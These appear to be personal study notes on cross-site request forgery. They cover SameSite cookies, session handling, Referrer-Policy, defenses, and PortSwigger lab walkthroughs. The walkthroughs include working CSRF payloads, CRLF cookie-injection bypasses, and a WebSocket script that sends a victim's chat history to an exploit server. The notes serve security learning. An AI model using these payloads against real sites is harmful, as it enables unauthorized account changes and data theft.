# What is CSRF ?
Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.
![[cross-site request forgery.svg]]
# How does CSRF work?
- **A relevant action.** There is an action within the application that the attacker has a reason to induce.
- **Cookie-based session handling.** Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.
- **No unpredictable request parameters.** The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess.
# What is the impact of a CSRF attack?
the attacker causes the victim user to make unintended action. For example, this might be to change the email address on their account, to change their password, or to make a funds transfer
## What is the difference between XSS and CSRF?
CSRF can be described as a "one-way" vulnerability, in that while an attacker can induce the victim to issue an HTTP request, they cannot retrieve the response from that request. Conversely, XSS is "two-way", in that the attacker's injected script can issue arbitrary requests, read the responses, and exfiltrate data to an external domain of the attacker's choosing.
## What is a site in the context of SameSite cookies?
![[site-definition.png]]
1. This is often referred to as the TLD+1
	- top-level domain (TLD), usually something like `.com` or `.net`
	- one additional level of the domain name
2. URL scheme is also taken into consideration
*This means that a link from `http://app.example.com` to `https://app.example.com` is treated as cross-site by most browsers.*
## What's the difference between a site and an origin?
The difference between a site and an origin is their scope; a site encompasses multiple domain names, whereas an origin only includes one. Although they're closely related, it's important not to use the terms interchangeably as conflating the two can have serious security implications.
![[site-vs-origin.png]]
Two URLs are considered to have the same origin if they share the exact same scheme, domain name, and port. Although note that the port is often inferred from the scheme.

---
## How does the browser knows that the request is done by `iframe` or script ?
#### Behind the Scenes: Request Headers
When the browser makes a request, it may include headers like:
- `Sec-Fetch-Site`: Says where the request **came from** (same-site, cross-site, etc.)
- `Sec-Fetch-Mode`: Tells what kind of resource (navigate, no-CORS, CORS, etc.)
- `Sec-Fetch-Dest`: Says the **purpose** of the request (document, image, script, `iframe`, etc.)
##### Example: Real browser request headers
###### When you click a link:
`GET /dashboard HTTP/1.1`
`Host: bank.com`
`Sec-Fetch-Site: cross-site`
`Sec-Fetch-Mode: navigate`
`Sec-Fetch-Dest: document`
###### When it comes from *`iframe`*
`GET /dashboard HTTP/1.1`
`Host: bank.com`
`Sec-Fetch-Site: cross-site`
`Sec-Fetch-Mode: navigate`
`Sec-Fetch-Dest: iframe`

#### why does browser will send the SameSite=Lax cookies in this case ?
`<script>`
`document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';`
`</script>`
###### What does this do?
It redirects the entire page (top-level window) to a new URL, just like a user clicking a link. This is called a top-level navigation, even though it’s triggered by JavaScript.

Because `document.location = URL` causes a **real top-level navigation**, the browser treats it the same as :
`<a href="...">Click</a>`

---
# Session Handling
**Session** = maintaining that authenticated state across multiple requests or real-time connections.
### 1. Cookie-based sessions (server-side session ID)
- **What**: Server issues a random session ID (`sid`) stored in an HTTP cookie. Server stores session data keyed by that ID (memory, Redis, DB).
- **Transport**: Browser sends cookie automatically every request.
- **Storage**: server memory, Redis/memcached, SQL DB, or distributed store.
- **Pros**: simple, secure if cookies set correctly; server can invalidate instantly.
- **Cons**: server-side storage required; scaling needs sticky sessions or central store.
- **Use-case**: traditional web apps, server-rendered sites.
Cookie attributes to use: `Secure`, `HttpOnly`, `SameSite=Lax/Strict`, `Path`, `Domain`, expiration.

### 2. JSON Web Tokens (JWT) / Self-contained tokens
- **What**: Server issues signed (and optionally encrypted) token containing claims (sub, exp, roles). Client stores token (cookie or localStorage) and sends with `Authorization: Bearer`.
- **Pros**: stateless verification, easy to scale, portable across services.
- **Cons**: revocation is hard unless you manage blacklist/short lifetimes + refresh tokens; long JWT life increases risk; sensitive to XSS if stored in JS-accessible storage.
- **Use-case**: APIs, microservices, single-page apps (with care).


---
###### referrer policy syntax 
*it only works at the same origin or HTTP or old browsers* 
- **Referrer-Policy:** no-referrer 
	The Referrer header will be deleted: sent requests do not include any referrer information
- **Referrer-Policy:** no-referrer-when-downgrade
	Send the origin, path, and query string in Referrer when the protocol security level stays the same or improves (HTTP→HTTP, HTTP→HTTPS, HTTPS→HTTPS). Don't send the Referrer header for requests to less secure destinations (HTTPS→HTTP, HTTPS→file)
- **Referrer-Policy:** origin 
	Send only the origin in the Referrer header. For example, a document at `example.com/page.html` will send the referrer `example.com/`
- **Referrer-Policy:** origin-when-cross-origin
	When performing a same-origin request to the same protocol level (HTTP→HTTP, HTTPS→HTTPS), send the origin, path, and query string. Send only the origin for cross origin requests and requests to less secure destinations (HTTPS→HTTP)
- **Referrer-Policy:** same-origin
	Send the origin, path, and query string for same-origin requests. Don't send the Referrer header for cross-origin requests
- **Referrer-Policy:** strict-origin
	Send only the origin when the protocol security level stays the same (HTTPS→HTTPS). Don't send the Referrer header to less secure destinations (HTTPS→HTTP)
- **Referrer-Policy:** strict-origin-when-cross-origin
	Send the origin, path, and query string when performing a same-origin request. For cross-origin requests send the origin (only) when the protocol security level stays same (HTTPS→HTTPS). Don't send the Referrer header to less secure destinations (HTTPS→HTTP)
- **Referrer-Policy:** unsafe-URL {my-arrow|#adfcf9|12}
	Send the origin, path, and query string when performing any request, regardless of security


## Labs
#Portswigger
1. **CSRF vulnerability with no defences** #APPRENTICE
	*walkthrough :*
	normal CSRF code with no challenges
	*payload :* 
	`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="anything%40web-security-academy.net"> </form> <script> document.forms[0].submit(); </script>`
2. **CSRF where token validation depends on request method** #PRACTITIONER
	*walkthrough :*
	it validates on the CSRF token only on the post method but when you change it to get method it does not validate the CSRF token
	*payload :* 
	`<form action="https://0a7100b5039066ec8a33af6800bc00f9.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@exploit-server.net"></form><script>document.forms[0].submit();</script>`
3. **CSRF where token validation depends on token being present** #PRACTITIONER
	*walkthrough :*
	it validates the CSRF token but if you delete it, it will accept the request
	*payload :* 
	`<form method="POST" action="https://0a5d003c0402913f80600da90086001b.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@123.com"></form><script>document.forms[0].submit();</script>`
4. **CSRF where token is not tied to user session** #PRACTITIONER
	*walkthrough :*
	it validates the CSRF token but it is not connected to the session so I open two accounts and steal the token from one of them and add it to the another account and the server check for the token and accept it
	*payload :* 
	`<form method="POST" action="https://0aab00b103ec4568830796af0038003b.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@51.com"><input type="hidden" name="csrf" value="uPEhoHrG1znn2YV2TVpaOtrgA7eE5RCf"></form><script>document.forms[0].submit();</script>`
5. **CSRF where token is tied to non-session cookie** #PRACTITIONER
	*walkthrough :*
	it validates the CSRF token which connected to the CSRF key so I open two accounts and steal the two parameters from one of them and add it to the another account and inject the http header to add the CSRF key into the header using the search functionality and the server accept it
	*payload :* 
	`<form method="POST" action="https://0a98008e04b4bc7f868f7501008b002c.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@123.com"><input type="hidden" name="csrf" value="waIBURgmMDfCfhPVwXogfv0nYrly3r12"></form><img src="https://0a98008e04b4bc7f868f7501008b002c.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=uK2u175yjgFOM1AsZJJAeLhiuJFdPUc1%3b%20SameSite=None" onerror="document.forms[0].submit()">`
6. **CSRF where token is duplicated in cookie** #PRACTITIONER
	*walkthrough :*
	it validates that the two CSRF must be the same so you can manipulate them both to exploit the CSRF using search function to over right the cookies of the user with any value and add the same value to the delivered script
	*payload :* 
	`<form method="POST" action="https://0a0e006a04a362af839d0005009f00d2.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@2.com"><input type="hidden" name="csrf" value="fake"></form><img src="https://0a0e006a04a362af839d0005009f00d2.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>`
7. **SameSite Lax bypass via method override** #PRACTITIONER
	*walkthrough :*
	the mitigation here is `SameSite` header which set automatically to LAX so in LAX it passes GET request and top-level navigation so we spoofed our method using this payload => **Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes - Why Symfony does this?
	Because HTML forms can’t send anything except GET & POST** which we will use to solve this lab
	*payload :* 
	`<script>document.location = "https://0a160052043c878e81f3b2f2005700db.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";</script>`
8. **SameSite Strict bypass via client-side redirect** #PRACTITIONER
	*walkthrough :*
	to solve this lab after knowing that the `SameSite` header is set to strict you should try to find open redirection and we found it on this path `/post/comment/confirmation?postId=1` and apply this
	*payload :* 
	`<script>document.location = "https://0a8000010429372d82b575ab00a00092.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";</script>`
9. **SameSite Strict bypass via sibling domain** #PRACTITIONER
	*walkthrough :*
	I found that if I send READY message to the web socket I will receive the chat history so I create a code that do this job and extract the message in BASE64 encoded :
	`<script>
	`var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');` `ws.onopen = function(evt) { ws.send("READY"); };`
	`ws.onmessage = function(evt) {`
	`var message = evt.data`
	`fetch('https://exploit-server/exploit?message=' + btoa(message))`
	`</script>`
	then I delivered the payload but I got no chat history because the browser did not include the cookies of the victim in the request (same site = strict) so I found another subdomain (same site) that vulnerable to XSS so i inject same payload but URL-Encoded and create new code that encapsulate the older one as a username parameter which vulnerable to XSS :
	`<script> document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=OLDER-CODE&password=anything"; </script>`
10. **SameSite Lax bypass via cookie refresh** #PRACTITIONER
	*walkthrough :*
	this an OAuth authentication and have no CSRF token but have LAX samesite so we will send normal CSRF request and change the email using first exploit {arrow|#ff0035|9} If you logged in less than two minutes ago, the attack is successful and your email address is changed but If it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. In this case, repeat this step immediately, notice that if you visit `/social-login`, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction so we will change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit `/social-login`, then submits the email change request after a short pause. {arr|#3595da|6} Observe that the initial request gets blocked by the browser's popup blocker. Realize that the popup is being blocked because you haven't manually interacted with the page. Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked {arro|#ecebeb|3}
	*payload :* 
	First : {arrow}
	`<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST"> <input type="hidden" name="email" value="foo@bar.com" /> <input type="submit" value="Submit request" /> </form> <script> document.forms[0].submit(); </script>`
	Second : {arr}
	`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@web-security-academy.net"> </form> <script> window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); function changeEmail(){ document.forms[0].submit(); } </script>`
	Third : {arro}
	`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@portswigger.net"> </form> <p>Click anywhere on the page</p> <script> window.onclick = () => { window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); } function changeEmail() { document.forms[0].submit(); } </script>`
11. **CSRF where Referrer validation depends on header being present** #PRACTITIONER
	*Some applications validate the `Referer` header when it is present in requests but skip the validation if the header is omitted. In this situation, an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the `Referer` header in the resulting request. There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the CSRF attack*
	it is a normal CSRF it validates the referrer header but if you delete it then the request will pass with no referrer header so you will use this code on the head tag to delete the header `<meta name="referrer" content="no-referrer">` 
	*payload :* 
	`<form method="POST"action="https://0a2e006b033f11cc830b1aee00d000ce.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@100.com"></form><script>document.forms[0].submit();</script>`
12. **CSRF with broken Referrer validation** #PRACTITIONER {my-arrow}
	we found that if we change the referrer header into `https://any-domain.com/?the-original-domain` the request will sent so we will sent the `pushState(state,title,URL)` function which append the URL to the  original domain on the action
	*payload :* 
	`<form method="POST" action="https://0ac200e304c17082822eb5e50004001f.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@4010.com"></form><script>history.pushState("", "", "/?0ac200e304c17082822eb5e50004001f.web-security-academy.net")document.forms[0].submit();</script>`
---
# Common defenses against CSRF
> using a perfect solution does not mean it has a perfect implementation 
#### 1. CSRF Token
	when you request the site the response will contain a hidden filed the contain the token and when you submit the form the hidden field will be sent via the request
###### The token must meet the following criteria :
- Unpredictable with high entropy, as for session tokens in general.
- Tied to the user's session.
- Strictly validated in every case before the relevant action is executed.
#### 2. Same Site Cookies
	SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. As requests to perform sensitive actions typically require an authenticated session cookie, the appropriate SameSite restrictions may prevent an attacker from triggering these actions cross-site.
The `SameSite` attribute is used to control whether cookies are sent with cross-site requests. It can take one of three values: `Strict`, `Lax`, or `None`.

1. `Strict`: Cookies are only sent in a first-party context and not with requests initiated by third-party websites.

2. `Lax`: Cookies are sent with **top-level navigation** and **GET** requests initiated by third-party websites.
###### What does **“top-level navigation by the user”** mean?
It means the user clicked on something (like a link or bookmark) that **caused the entire browser tab or window to change** to a new website.
Think of it like this:
- You're on **Site A**, and you **click a link** to **Site B**
- The browser **leaves Site A** and **goes to Site B**
- The new page is fully loaded in the **main window** (not in an `iframe`, not from JavaScript)

**Examples of non top level navigation :**
- `<form method="POST">`
- `<img src="...">`
- `<script src="...">`
- `<iframe src="...">`
- `fetch()` / AJAX
- Redirect from another site

**Examples of top level navigation :**
- The user types in the address bar
- `<a href="...">`
- GET form
- Normal form submit not JavaScript submit


3. `None`: Cookies are sent with all requests, including cross-site and third-party requests (requires `Secure` flag which ensures that the cookie is only sent in encrypted messages over HTTPS. Otherwise, browsers will reject the cookie and it won't be set.)
#### 3. Referrer-Based Validation
	header that indicates the URL of the webpage that initiated the request.
	Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks.
###### Ways of referrer circumvented :
- victim as a subdomain
	`http://vulnerable-website.com.attacker-website.com/csrf-attack`
- victim as a directory
	`http://attacker-website.com/csrf-attack?vulnerable-website.com`
#### 4. Double Submit Cookie
###### The server sets a **random token** in **two places**:
    1. A Cookie (sent automatically by the browser).
    2. A Hidden Form Field or Custom Header (sent explicitly by the client).
The server then **verifies that both values match** before processing the request.
##### step 1: Server Issues a Random Token
When a user logs in or loads a form, the server generates a **cryptographically random token** (e.g., `ABC123`).
**The server**
- Sets it in a **cookie** (HTTP-only, Secure, SameSite=Lax).
- Embeds the **same token** in the HTML form (or JavaScript).
##### Step 2: Browser Sends Both Tokens
When the user submits the form:
The browser **automatically** sends the cookie:
`Cookie: csrf_token=ABC123`
The form **explicitly** sends the hidden field:
`POST /change-email HTTP/1.1`
`Content-Type: application/x-www-form-urlencoded`

`csrf_token=ABC123&email=user@example.com`

##### Step 3: Server Validates the Tokens
The server checks:
`if (req.cookies.csrf_token === req.body.csrf_token) {`
  `// Request is legitimate!`
`} else {`
  `// Block request (CSRF attack detected)`
`}`
###### Why Does This Prevent CSRF?

| Attack Scenario                                 | Why It Fails                                                                            |
| ----------------------------------------------- | --------------------------------------------------------------------------------------- |
| **Attacker tries to forge a request**           | The attacker can’t read the cookie (due to `HttpOnly`) or set it (due to `SameSite`).   |
| **Attacker guesses the token**                  | The token is cryptographically random (e.g., 128-bit), making brute-forcing impossible. |
| **Attacker tricks user into submitting a form** | The form won’t have the correct token in both the cookie **and** the body/header.       |
#### 5. Include token at custom request headers
`X-CSRF-Token: RANDOM_TOKEN` or `X-Requested-With: XMLHttpRequest`
###### Why This Defeats CSRF

| Attack Method               | Why It Fails                                                                        |
| --------------------------- | ----------------------------------------------------------------------------------- |
| **`<form>` submissions**    | Cannot add custom headers.                                                          |
| **`<img>`/`<script>` tags** | Only trigger GET requests (no headers).                                             |
| **Cross-origin AJAX**       | Blocked by SOP unless CORS explicitly allows it (and attackers can’t control CORS). |
#### 6. User Interaction Requirements
- Re-authentication (password confirmation)
- CAPTCHAs
- One-time tokens (OTP)
#### 7. Framework-Specific Protections
#### 8. Origin header
can only protect website from CSRF attack if the attack include JS code that fetch response

```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Radar

#-----------------#
#- chart data    -#
#-----------------#
data:
  - item: "Back-End Code"
    user: "Effective against the attack"
    score: 90
  - item: "Browser"
    user: "Effective against the attack"
    score: 60
  - item: "Server"
    user: "Effective against the attack"
    score: 10
  - item: "Client-Side Code"
    user: "Effective against the attack"
    score: 0
  - item: "WAF"
    user: "Effective against the attack"
    score: 0

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "item"
  yField: "score"
  seriesField: "user"
  meta:
    score:
      alias: "Score"
      min: 0
      nice: true
  xAxis:
    line: null
    tickLine: null
  yAxis:
    label: false
    grid:
      alternateColor: "rgba(0, 0, 0, 0.1)"
  point: {}
  area: {}
```

---
# NOTES
* the browser is the one who set the referrer header
* if the SameSite is not set it will be set to lax
* method spoofing is when you when send a get request but you intercept it as post request like in this code `<form method="GET"><input type="hidden" name="_method" value="POST"></form>`
* token error can make the request pass
- we can make a CSRF attack using `<img>` tag if the attack uses GET request it will be self contained like this : `<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">`
- most CSRF token names (`X-CSRF-TOKEN`, `lia-token`, `rt`, `form-id`, `csrf`)
- The delivery mechanisms for cross-site request forgery attacks are essentially the same as for reflected XSS
- CSRF tokens should not be transmitted within cookies.
- There may be more than one request which can be used to do same thing.

# Techniques
#### 1. No CSRF token
#### 2. Try regular CSRF token bypass
1. remove CSRF token
2. remove the value of CSRF token
3. set value of CSRF token to 0 `CSRFtoken=0` or as array `CSRFtoken[]=0`
4. change the request method without the token
#### 3. Bypass double submit cookie
1. this technique will be valid if you can overwrite the cookies to the user or manipulate the set cookie header by adding new set cookie which allow you to add your account CSRF-cookie to the victim cookie and write an exploit using your CSRF token value
2. maybe you could try to use the previous technique if the double cookies must be the same
#### 3. perform a request, capture the token value, and then drop the request
to ensure that the token still valid
#### 4. If the requests are sent in the JSON format and no CSRF token and you can add garbage value to the JSON
The only way we could exploit this is if the server wasn’t checking the ==`Content-Type`== header and enforcing it to be `"application/json"`.
*because if the application validate the content type and you sent CSRF attack using normal form the data will not be sent as JSON format, even if you could manipulate the format of the data to be sent like JSON the header will not change and the request will be rejected*
**normal CSRF content type header =>** `Content-Type: application/x-www-form-urlencoded`
**JSON content type header =>** `Content-Type: application/json`
###### CSRF POC
`<html>`  
  `<head><meta name="referrer" content="unsafe-url"></head>`  
  `<body>`  
  `<script>history.pushState('', '', '/')</script>`  
  `<form name="hacker" method="POST" action="https://account.example.com/phone.json" enctype="text/plain">`  
    `<input type="hidden"`  
    `name= '{"phone":"01111111118","a":"' value='"}'>`  
    `</form>`  
    `<script>      document.forms[0].submit();    </script>`  
  `</body>`  
`</html>`
#### 5. search for any specific patterns or files in the client-side JavaScript that might contain algorithm to generate the CSRF Token
#### 6. bypass double submit cookie if there is XSS at the website and the value of the cookie printed at the response header
by overwrite the cookie value using XSS :
`<form method="POST" action="https://0a98008e04b4bc7f868f7501008b002c.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@123.com"><input type="hidden" name="csrf" value="waIBURgmMDfCfhPVwXogfv0nYrly3r12"></form><img src="https://0a98008e04b4bc7f868f7501008b002c.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=uK2u175yjgFOM1AsZJJAeLhiuJFdPUc1%3b%20SameSite=None" onerror="document.forms[0].submit()">`
#### 7. CSRF where token is duplicated in cookie
